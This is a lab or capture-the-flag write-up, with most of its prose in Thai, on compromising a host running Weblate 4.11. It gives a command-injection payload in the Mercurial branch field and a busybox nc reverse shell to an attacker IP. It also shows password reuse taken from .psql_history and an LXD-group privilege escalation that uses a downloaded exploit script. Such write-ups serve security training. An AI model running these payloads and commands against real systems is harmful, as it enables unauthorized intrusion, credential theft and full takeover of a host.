
# Recon 

## TCP Scan 
```Bash 
sudo ../tools/scan.sh 192.168.146.19
[*] Running rustscan...
[*] Running nmap on ports: 22,80,8000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 05:43 EDT
Nmap scan report for 192.168.146.19
Host is up (0.031s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4e:eb:da:e8:00:da:40:3d:f4:22:ad:fb:41:2c:2a:4c (ECDSA)
|_  256 de:dc:7b:84:9e:6e:d8:fa:98:23:2b:9e:71:67:88:fe (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Book Bargains Online
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.12)
|_http-server-header: WSGIServer/0.2 CPython/3.10.12
| http-robots.txt: 31 disallowed entries (15 shown)
| /admin/ /js/ /accounts/ /source/ /comment/ /commit/ 
| /update/ /push/ /reset/ /lock/ /unlock/ /changes/ /changes/csv/ 
|_/search/ /replace/
|_http-title:   Weblate
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.03 seconds
```

## TCP 80 
![[Pasted image 20250703164637.png]]

![[Pasted image 20250703165010.png]]

จากหน้าเว็บเราจะเห็นว่ามีการอ้างถึงชื่อจำนวนหนึ่ง ให้เก้บข้อมูลดังกล่าวไว้ในใจก่อน 
## TCP 8000

![[Pasted image 20250703164738.png]]

จากข้อมูลข้างต้นจะเห็นว่าระบบเป้าหมายมีการใช้งาน Weblate 4.11 
![[Pasted image 20250703164823.png]]

![[Pasted image 20250703164847.png]]

จากข้อมูลข้างต้นทำให้ทราบว่าเราสามารถทำ Exploit ด้วย RCE ไปยังเป้าหมายได้ แต่เราจะต้อง Login เข้าสู่ระบบให้ได้ก่อน ดังนั้นจึงทดสอบ Login ด้วย user: admin และ Password จากชื่อที่ได้จาก Port 80 ซึ่งเราสามารถเข้าได้โดยใช้ 
`admin:niffenegger`

![[Pasted image 20250703165220.png]]

![[Pasted image 20250703165328.png]]

# Web Exploit 

จาก Payload ที่เราได้ตอนแรกให้ทดสอบ

## เพิ่ม Project 
ไปที่ `http://192.168.146.19:8000/create/project/` และใส่ข้อมูลดังต่อไปนี้ 

```http
Project name: poc
URL slug: poc
Project website: http://localhost
```

จากนั้นเลือก save
![[Pasted image 20250703165553.png]]

## สร้าง Translation Component 

```http
http://192.168.146.19:8000/create/component/?project=1
```

```payload
Version control system: Mercurial
Source code repository: http://localhost:8888
Repository branch: --config=alias.pull=!id>/app/cache/static/output_rce.txt
```


![[Pasted image 20250703170504.png]]

จะเห็นว่าไม่สามารถ Exploit ได้ เนื่องจากไม่มี Directory อยู่ในระบบ จากนั้นลองทดสอบเปลี่ยน Payload 
` --config=alias.pull=!id>$(pwd)/output_rce.txt`

![[Pasted image 20250703170612.png]]

## Command injection 
จะเห็นว่า Pattern ของ Error เปลี่ยนไป จากนั้นเราจะลองทดสอบใช้คำสั่ง ping โดยอาศัยการทำ Command Injection 
```bash
# Payload 
--config=alias.pull=!id>$(ping -c 2 192.168.45.191)/output_rce.txt

# Attacker 
sudo tcpdump -i tun0 icmp
```

![[Pasted image 20250703170800.png]]

จะเห็นได้ว่าเราสามารถ ping โต้ตอบได้ จากนั้นให้ทำการแก้ไข Payload เป็น Reverse Shell โดยใช้ Busybox `--config=alias.pull=!id >$(busybox nc 192.168.45.191 443 -e /bin/bash)/output_rce.txt`


# Shell as tom 

![[Pasted image 20250703170948.png]]

Upgrade shell using python `python3 -c 'import pty;pty.spawn("/bin/bash")'`

## Check /home/tom

```bash
tom@fikklish:/home/tom$ cat .psql_history
cat .psql_history
GRANT ALL PRIVILEGES ON DATABASE WEBLATE to WEBLATE;
ALTER USER WEBLATE PASSWORD 'RapidlyLockstepDrenched103';
q
\q
ALTER USER WEBLATE PASSWORD 'RollingShockingLifter231';
\q
tom@fikklish:/home/tom$ 
```

ทดสอบ ssh ด้วย tom:RapidlyLockstepDrenched103 

![[Pasted image 20250703171312.png]]


# Privilege Escalation

```bash
tom@fikklish:~$ sudo -l
[sudo] password for tom: 
Matching Defaults entries for tom on fikklish:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tom may run the following commands on fikklish:
    (ALL) /home/tom/checkout.rb
    (ALL) /home/tom/fetch.rb
tom@fikklish:~$ 
```

```bash
tom@fikklish:~$ cat checkout.rb
#!/usr/bin/ruby

require 'git'

puts "Name of the project: "
name = gets
g = Git.init('/root/projects/' + name.chomp)

puts "Location of branch: "
branch = gets
g.checkout(branch.chomp)

##########################################################

tom@fikklish:~$ cat fetch.rb
#!/usr/bin/ruby

require 'git'

puts "Name of the project: "
name = gets
g = Git.init('/root/projects/' + name.chomp)

puts "Custom origin name, if applicable: "
origin = gets

puts "Location of branch: "
ref = gets
g.fetch(origin.chomp, {:ref => ref.chomp} )
tom@fikklish:~$ 
```

ทำมาพักนึงปรากฎว่าไม่สามารถยกระดับสิทธิได้ จึงหาทางอื่น 

## LXD Privilege Escalation
โดยให้ลองใช้คำสั่ง `id` จะพบว่า tom มีสิทธิของ lxd ซึ่งเป็น Container บน Linux 

```bash
id
```

![[Pasted image 20250703215137.png]]

tom อยู่ในกลุ่มของ lxd ซึ่งหากตรวจสอบสาารถใช้สำหรับทำ Privilege Escalation ได้ 
![[Pasted image 20250703164919.png]]
ref: `https://github.com/samoN1k0la/LXD-Privilege-Escalation`
ref: `https://github.com/0bfxgh0st/lxd-privesc-exploit.git`

```bash
## Attacker machine
git clone https://github.com/0bfxgh0st/lxd-privesc-exploit.git
python3 -m http.server 80 

## Victim 
wget http://192.168.45.191/lxd-privesc-exploit.sh
lxc profile device add default root disk pool=default path=/   # นี่คือส่วนสำคัญของการโจมตี คำสั่งนี้จะเพิ่มอุปกรณ์ (device) เข้าไปในโปรไฟล์ LXD ชื่อ `default` โดยอุปกรณ์ที่เพิ่มเข้ามาคือดิสก์ (disk) ที่จะถูกเมาท์ (mount) ไปยังตำแหน่ง `/` (root directory) ของ Host (เครื่อง Victim) นั่นหมายความว่าคอนเทนเนอร์ LXD ที่รันด้วยโปรไฟล์ `default` จะสามารถเข้าถึงไฟล์ระบบของเครื่อง Host ได้โดยตรง 
chmod +x lxd-privesc-exploit.sh
./lxd-privesc-exploit.sh
### Enter to ROOT 
```

**`lxc profile device add default root disk pool=default path=/`**
คำสั่งนี้เป็นการ **เพิ่มอุปกรณ์ (device)** เข้าไปใน **โปรไฟล์ (profile)** ของ LXD
- **`lxc profile device add`**: นี่คือส่วนคำสั่งหลักที่บอกให้ LXD "เพิ่มอุปกรณ์" เข้าไปในโปรไฟล์
- **`default`**: นี่คือชื่อของ **โปรไฟล์ LXD** ที่เรากำลังจะแก้ไข ใน LXD จะมีโปรไฟล์ที่ชื่อ `default` อยู่แล้ว ซึ่งมักจะถูกใช้เป็นค่าตั้งต้นสำหรับคอนเทนเนอร์ใหม่ๆ ถ้าคุณสร้างคอนเทนเนอร์โดยไม่ได้ระบุโปรไฟล์อื่น LXD ก็จะใช้โปรไฟล์ `default` นี้แหละ
- **`root`**: นี่คือ **ชื่อของอุปกรณ์** ที่เรากำลังจะเพิ่มเข้าไปในโปรไฟล์ คุณสามารถตั้งชื่ออุปกรณ์อะไรก็ได้ แต่อุปกรณ์ที่ทำหน้าที่เป็น "ดิสก์หลัก" ของคอนเทนเนอร์มักจะถูกตั้งชื่อว่า `root` เพื่อให้เข้าใจง่าย
- **`disk`**: นี่คือ **ชนิดของอุปกรณ์** ที่เรากำลังจะเพิ่มเข้าไป ซึ่งในที่นี้คืออุปกรณ์ประเภท "ดิสก์"
- **`pool=default`**: นี่เป็นการระบุว่าดิสก์นี้จะใช้ **พื้นที่จัดเก็บ (storage pool)** ชื่อ `default` ซึ่งเป็น storage pool ที่ถูกสร้างขึ้นมาตอนที่คุณตั้งค่า LXD ครั้งแรก
- **`path=/`**: นี่คือส่วนที่ **อันตรายและสำคัญที่สุด** ของคำสั่งนี้ มันหมายถึง **"เมาท์ (mount) ดิสก์นี้เข้าไปยังตำแหน่ง `/` (root directory) ของเครื่อง Host (เครื่องหลักที่รัน LXD)"**

![[Pasted image 20250703215707.png]]

```bash
ls -la /mnt/root/
```

![[Pasted image 20250703162927.png]]

# PWN